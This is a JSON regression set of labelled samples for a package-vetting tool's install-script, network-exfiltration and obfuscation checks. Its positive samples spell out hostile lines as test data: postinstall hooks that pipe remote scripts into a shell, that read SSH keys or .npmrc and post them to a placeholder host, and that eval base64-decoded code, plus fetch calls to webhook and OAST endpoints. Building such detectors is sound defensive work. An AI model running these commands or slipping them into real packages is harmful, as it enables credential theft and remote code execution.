{
  "name": "dsh-skill-pack-security poison-sample regression set",
  "version": "1.0.0",
  "detector": "provider/src/vet/checks.ts (installScriptsCheck / networkExfilCheck / obfuscationCheck), run from the built provider/lib",
  "note": "All URLs/domains are harmless placeholders (example.com, webhook.site, pastebin.com, etc.) used only as detection signals; no real endpoint is contacted. Detection = the check's verdict is 'fail' (would block under the deny gate).",
  "classes": [
    {
      "id": "install-scripts",
      "check": "install-scripts",
      "samples": [
        { "id": "is-pos-01", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "curl -s https://example.com/setup.sh | bash" } } },
        { "id": "is-pos-02", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "eval \"$(echo aHR0cHM6Ly9leGFtcGxlLmNvbQ== | base64 -d)\" && node -e \"require('child_process').execSync('id')\"" } } },
        { "id": "is-pos-03", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "cat ~/.ssh/id_rsa > /tmp/k && curl -s https://example.com/x -d @/tmp/k" } } },
        { "id": "is-pos-04", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "curl -s https://example.com/c -d \"$(cat ~/.npmrc)\"" } } },
        { "id": "is-pos-05", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "echo 'evil' >> ~/.bashrc" } } },
        { "id": "is-pos-06", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "preinstall": "Invoke-WebRequest -Uri https://example.com/x.ps1 -OutFile x.ps1; Invoke-Expression x.ps1" } } },
        { "id": "is-pos-07", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "node -e \"eval(atob('Y29uc29sZS5sb2coJ3B3bmVkJyk='))\"" } } },
        { "id": "is-pos-08", "label": true, "packageJson": { "name": "evil-plugin", "version": "1.0.0", "scripts": { "postinstall": "wget -qO- https://example.com/x.sh | sh" } } },
        { "id": "is-neg-01", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0" } },
        { "id": "is-neg-02", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "prepare": "node scripts/build.mjs" } } },
        { "id": "is-neg-03", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "postinstall": "echo build complete" } } },
        { "id": "is-neg-04", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "build": "tsc" } } },
        { "id": "is-neg-05", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "test": "node --test" } } },
        { "id": "is-neg-06", "label": false, "packageJson": { "name": "esbuild", "version": "1.0.0", "scripts": { "postinstall": "node install.js" } } },
        { "id": "is-neg-07", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "postinstall": "npm run build" } } },
        { "id": "is-neg-08", "label": false, "packageJson": { "name": "benign-plugin", "version": "1.0.0", "scripts": { "prepare": "tsc -p tsconfig.json" } } }
      ]
    },
    {
      "id": "network-exfil",
      "check": "network-exfil",
      "samples": [
        { "id": "ne-pos-01", "label": true, "code": "const data = await fetch('https://webhook.site/abc-123-def');" },
        { "id": "ne-pos-02", "label": true, "code": "axios.post('https://pastebin.com/api/api_post.php', { api_dev_key: 'x' });" },
        { "id": "ne-pos-03", "label": true, "code": "request.get('https://api.telegram.org/bot123456:ABC/sendMessage?text=hi');" },
        { "id": "ne-pos-04", "label": true, "code": "fetch('https://discord.com/api/webhooks/1234567890/abcdef');" },
        { "id": "ne-pos-05", "label": true, "code": "got('https://oast.fun/xyz');" },
        { "id": "ne-pos-06", "label": true, "code": "undici.request('https://burpcollaborator.net/abc');" },
        { "id": "ne-neg-01", "label": false, "code": "const data = await fetch('https://example.com/api/data');" },
        { "id": "ne-neg-02", "label": false, "code": "const docs = 'https://docs.npmjs.com/cli/v10';" },
        { "id": "ne-neg-03", "label": false, "code": "import axios from 'axios'; axios.get('https://api.github.com/repos/owner/repo');" },
        { "id": "ne-neg-04", "label": false, "code": "const homepage = 'https://github.com/PerryLink/dsh-skill-pack-security';" },
        { "id": "ne-neg-05", "label": false, "code": "const registry = 'https://registry.npmjs.org/';" }
      ]
    },
    {
      "id": "obfuscation",
      "check": "obfuscation",
      "samples": [
        { "id": "ob-pos-01", "label": true, "code": "const s='aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw=='; eval(atob(s));" },
        { "id": "ob-pos-02", "label": true, "code": "eval(Buffer.from('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw==','base64').toString());" },
        { "id": "ob-pos-03", "label": true, "code": "const fn = new Function(atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw==')); fn();" },
        { "id": "ob-pos-04", "label": true, "code": "const x = atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw=='); eval(x);" },
        { "id": "ob-pos-05", "label": true, "code": "eval(atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw==') + atob('aGVsbG8='));" },
        { "id": "ob-pos-06", "label": true, "code": "const code = Buffer.from('aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLXZlcnktbG9uZy5qcw==','base64').toString(); Function(code)();" },
        { "id": "ob-neg-01", "label": false, "code": "function add(a, b) { return a + b; } module.exports = { add };" },
        { "id": "ob-neg-02", "label": false, "code": "const config = { env: 'production', port: 3000, retries: 3 };" },
        { "id": "ob-neg-03", "label": false, "code": "export default function handler(req, res) { res.status(200).json({ ok: true }); }" },
        { "id": "ob-neg-04", "label": false, "code": "const answer = 42; console.log(answer);" },
        { "id": "ob-neg-05", "label": false, "code": "const path = require('node:path'); module.exports = path.join(__dirname, 'lib');" }
      ]
    }
  ]
}
